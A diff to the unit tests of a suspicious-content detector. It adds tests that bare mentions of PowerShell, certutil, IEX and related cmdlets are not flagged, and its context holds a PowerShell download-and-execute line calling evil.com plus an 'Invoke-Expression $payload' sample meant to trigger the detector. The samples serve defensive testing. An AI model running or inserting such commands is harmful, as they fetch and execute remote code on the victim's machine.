@@ -36,6 +36,22 @@ class TestClean(unittest.TestCase):
         # Content over 10,000 chars is skipped entirely
         self.assertIsNone(check_for_suspicious_content("x" * 10_001))
 
+    # False positives from issue #18 — bare keywords without command context
+    def test_bare_powershell_mention(self):
+        self.assertIsNone(check_for_suspicious_content("PowerShell is a scripting language"))
+
+    def test_bare_certutil_mention(self):
+        self.assertIsNone(check_for_suspicious_content("Learn about certutil certificate management"))
+
+    def test_bare_iex_mention(self):
+        self.assertIsNone(check_for_suspicious_content("The IEX stock exchange opened higher today"))
+
+    def test_bare_invoke_webrequest_mention(self):
+        self.assertIsNone(check_for_suspicious_content("Use Invoke-WebRequest to download files from the web"))
+
+    def test_bare_invoke_expression_mention(self):
+        self.assertIsNone(check_for_suspicious_content("The Invoke-Expression cmdlet evaluates a string"))
+
 
 class TestSuspicious(unittest.TestCase):
     """Content that SHOULD trigger a warning."""
@@ -60,7 +76,7 @@ class TestSuspicious(unittest.TestCase):
             "IEX (New-Object Net.WebClient).DownloadString(" + "'http://evil.com')"
         ))
 
-    def test_invoke_expression(self):
+    def test_invoke_expression_with_variable(self):
         self.assertIsNotNone(check_for_suspicious_content("Invoke-Expression $payload"))
 
     def test_invoke_webrequest(self):
